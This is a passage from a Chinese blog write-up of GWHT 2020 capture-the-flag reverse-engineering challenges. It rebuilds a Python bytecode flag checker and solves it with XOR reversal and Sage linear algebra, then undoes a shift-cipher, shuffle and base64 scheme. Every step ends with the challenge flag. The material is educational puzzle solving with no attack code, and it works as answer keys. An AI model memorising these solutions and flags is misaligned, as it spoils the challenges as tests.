class="comment">#U_G07_th3_k3y!</span></span><br></pre></td></tr></table></figure></li></ul><p>对input进行md5哈希得flag。</p><p><strong>flag:</strong> GWHT{58964088b637e50d3a22b9510c1d1ef8}</p><p>​</p><h3 id="Bytecode"><a href="#Bytecode" class="headerlink" title="Bytecode"></a>Bytecode</h3><blockquote><p>了解一下Bytecode</p></blockquote><p>按照<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yinguohai/p/11158492.html">Python字节码规则</a>手工逆向，还原过程中可不断使用<code>python -m dis code.py</code>对比是否正确。</p><p>还原出源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">en=[<span class="number">3</span>,<span class="number">37</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">132</span>]</span><br><span class="line">output=[<span class="number">101</span>,<span class="number">96</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">112</span>,<span class="number">42</span>,<span class="number">107</span>,<span class="number">62</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">176</span>,<span class="number">179</span>,<span class="number">98</span>,<span class="number">53</span>,<span class="number">67</span>,<span class="number">29</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">60</span>,<span class="number">106</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">178</span>,<span class="number">189</span>,<span class="number">101</span>,<span class="number">48</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;welcome to GWHT2020&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag=raw_input(<span class="string">&#x27;please input your flag:&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span>=flag</span><br><span class="line"></span><br><span class="line">a=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">if</span> a&lt;<span class="number">38</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;length wrong!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> (((<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>])*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">1</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">2</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">3</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">4</span>])==<span class="number">1182843538814603</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;good!continue\xe2\x80\xa6\xe2\x80\xa6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#GWHT&#123;</span></span><br><span class="line">	</span><br><span class="line">x=[]</span><br><span class="line">k=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">	b=<span class="built_in">ord</span>(<span class="built_in">str</span>[k])</span><br><span class="line">	c=<span class="built_in">ord</span>(<span class="built_in">str</span>[k+<span class="number">1</span>])</span><br><span class="line">	a11=c^en[i%<span class="number">6</span>]</span><br><span class="line">	a22=b^en[i%<span class="number">6</span>]</span><br><span class="line">	x.append(a11)</span><br><span class="line">	x.append(a22)</span><br><span class="line">	k+=<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> x==output:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;good!continue\xe2\x80\xa6\xe2\x80\xa6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;oh,you are wrong!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line">l=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">a1=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">7</span>])</span><br><span class="line">a2=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">6</span>])</span><br><span class="line">a3=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">5</span>])</span><br><span class="line">a4=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">4</span>])</span><br><span class="line">a5=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">3</span>])</span><br><span class="line">a6=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">2</span>])</span><br><span class="line"><span class="keyword">if</span> a1*<span class="number">3</span>+a2*<span class="number">2</span>+a3*<span class="number">5</span>==<span class="number">1003</span>:</span><br><span class="line">	<span class="keyword">if</span> a1*<span class="number">4</span>+a2*<span class="number">7</span>+a3*<span class="number">9</span>==<span class="number">2013</span>:</span><br><span class="line">		<span class="keyword">if</span> a1+a2*<span class="number">8</span>+a3*<span class="number">2</span>==<span class="number">1109</span>:</span><br><span class="line">			<span class="keyword">if</span> a4*<span class="number">3</span>+a5*<span class="number">2</span>+a6*<span class="number">5</span>==<span class="number">671</span>:</span><br><span class="line">				<span class="keyword">if</span> a4*<span class="number">4</span>+a5*<span class="number">7</span>+a6*<span class="number">9</span>==<span class="number">1252</span>:</span><br><span class="line">					<span class="keyword">if</span> a4+a5*<span class="number">8</span>+a6*<span class="number">2</span>==<span class="number">644</span>:</span><br><span class="line">						<span class="built_in">print</span>(<span class="string">&#x27;congraduation!you get the right flag!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>三部分，1.简单爆破，可直接猜测出<code>GWHT&#123;</code>，2.数组异或，反推，3.线性方程组，Sage解。</p><p>连起来即flag。</p><ul><li><p>数组异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">en = [<span class="number">3</span>,<span class="number">37</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">132</span>]</span><br><span class="line">output = [<span class="number">101</span>,<span class="number">96</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">112</span>,<span class="number">42</span>,<span class="number">107</span>,<span class="number">62</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">176</span>,<span class="number">179</span>,<span class="number">98</span>,<span class="number">53</span>,<span class="number">67</span>,<span class="number">29</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">60</span>,<span class="number">106</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">178</span>,<span class="number">189</span>,<span class="number">101</span>,<span class="number">48</span>]</span><br><span class="line">ori = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">	c = output[k]^en[i%<span class="number">6</span>]</span><br><span class="line">	b = output[k+<span class="number">1</span>]^en[i%<span class="number">6</span>]</span><br><span class="line">	ori += <span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)</span><br><span class="line">	k += <span class="number">2</span></span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(ori)</span><br><span class="line"><span class="comment">#cfa2b87b3f746a8f0ac5c5963f</span></span><br></pre></td></tr></table></figure></li><li><p>Sage解方程组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">A = Matrix([[<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>],[<span class="number">4</span>,<span class="number">7</span>,<span class="number">9</span>],[<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>]])</span><br><span class="line">Y1 = vector([<span class="number">1003</span>,<span class="number">2013</span>,<span class="number">1109</span>])</span><br><span class="line">Y2 = vector([<span class="number">671</span>,<span class="number">1252</span>,<span class="number">644</span>])</span><br><span class="line"><span class="built_in">print</span>(A \ Y1)</span><br><span class="line"><span class="built_in">print</span>(A \ Y2)</span><br><span class="line"><span class="comment">#(97, 101, 102)</span></span><br><span class="line"><span class="comment">#(102, 55, 51)</span></span><br><span class="line"><span class="comment">#aef73</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>flag:</strong> GWHT{cfa2b87b3f746a8f0ac5c5963faef73}</p><p>​</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><blockquote><p>easyre</p></blockquote><p>IDA打开，跟踪到<code>main</code>函数，代码逻辑清晰，输入字符串通过三步加密处理得到密文：</p><p><code>encode_one</code>是base64编码函数，<code>encode_two</code>是字符串分四块乱序函数，<code>encode_three</code>是简单移位函数。</p><p>Python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#x27;</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">	x=<span class="built_in">ord</span>(s[i])</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		y=-<span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> j&lt;=<span class="number">64</span> <span class="keyword">or</span> j&gt;<span class="number">90</span>:</span><br><span class="line">			<span class="keyword">if</span> j&lt;=<span class="number">96</span> <span class="keyword">or</span> j&gt;<span class="number">122</span>:</span><br><span class="line">				<span class="keyword">if</span> j&lt;=<span class="number">47</span> <span class="keyword">or</span> j&gt;<span class="number">57</span>:</span><br><span class="line">					y=j</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					y=(j-<span class="number">48</span>+<span class="number">3</span>)%<span class="number">10</span>+<span class="number">48</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				y=(j-<span class="number">97</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			y=(j-<span class="number">65</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">		<span class="keyword">if</span> y==x:</span><br><span class="line">			t+=<span class="built_in">chr</span>(j)</span><br><span class="line"><span class="comment">#t=&#x27;BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD&#x27;</span></span><br><span class="line"></span><br><span class="line">u=t[<span class="number">13</span>:<span class="number">26</span>]+t[<span class="number">39</span>:]+t[:<span class="number">13</span>]+t[<span class="number">26</span>:<span class="number">39</span>]</span><br><span class="line"><span class="comment">#u=&#x27;R1dIVHs2NzJjYzQ3NzhhMzhlODBjYjM2Mjk4NzM0MTEzM2VhMn0=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(u.encode()))</span><br><span class="line"><span class="comment">#GWHT&#123;672cc4778a38e80cb362987341133ea2&#125;</span></span><br></pre></td></tr></table></figure><p><strong>flag:</strong> GWHT{672cc4778a38e80cb362987341133ea2}</p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/09/26/match-CTFshow-%E6%9C%88%E9%A5%BC%E6%9D%AF/" title="CTFshow 月饼杯"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2020/09/03/web-SSRF/" title="SSRF"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>